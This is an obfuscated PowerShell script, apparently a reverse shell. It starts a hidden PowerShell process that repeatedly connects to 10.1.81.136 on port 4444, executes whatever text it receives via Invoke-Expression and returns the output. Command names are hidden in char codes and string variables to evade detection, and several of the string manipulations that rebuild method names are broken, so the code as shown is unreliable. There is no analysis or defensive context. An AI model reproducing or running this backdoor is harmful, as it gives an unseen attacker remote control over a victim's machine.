$b4d7f = [char[]]@(83,116,97,114,116,45,80,114,111,99,101,115,115) -join ''
& $b4d7f $PSHOME\powershell.exe -ArgumentList {
  [string]$v1 = 'New-Object'
  [string]$v2 = 'Net.Sockets.TCPClient'
  [string]$v3 = 'GetStream'
  [string]$v4 = 'IO.StreamWriter'
  [string]$v5 = 'byte[]'
  [string]$v6 = 'ReceiveBufferSize'
  [string]$v7 = 'Write'
  [string]$v8 = 'Flush'
  [string]$v9 = 'Read'
  [string]$v10 = 'text.encoding'
  [string]$v11 = 'UTF8'
  [string]$v12 = 'GetString'
  [string]$v13 = 'Invoke-Expression'
  [string]$v14 = 'Out-String'
  [string]$v15 = 'Close'
  [string]$v16 = 'Start-Sleep'
  [string]$v17 = 'Seconds'
  
  while ($true) {
    try {
      $a = & ([scriptblock]::Create($v1)) ($v2 -replace '_','')('10.1.81.136',4444)
      $b = $a.$($v3 -creplace '[a-z]','')()
      $c = & ([scriptblock]::Create($v1)) ($v4 -join '')($b)
      [byte[]]$d = 0..$a.$($v6 -replace 'BufferSize','') | % {0}

      function f ($e) {
        $c.$($v7 -replace '^W','')($e)
        $c.$($v8 -replace '^F','')()
      }

      f ('')

      while (($g = $b.$($v9 -replace '^R','')($d, 0, $d.Length)) -gt 0) {
        $h = ([text.encoding]::UTF8).$($v12 -replace 'Get','')($d, 0, $g - 1)
        $i = try {
          & ([scriptblock]::Create($v13)) $h 2>&1 | & ([scriptblock]::Create($v14))
        } catch {
          $_ | & ([scriptblock]::Create($v14))
        }
        f ($i)
      }

      $c.$($v15 -replace '^C','')()
      $a.$($v15 -replace '^C','')()
    }
    catch {
      $v16 -split '-' | % { if ($_ -eq 'Sleep') { & $_ -$v17 10 } }
    }
  }
} -WindowStyle Hidden
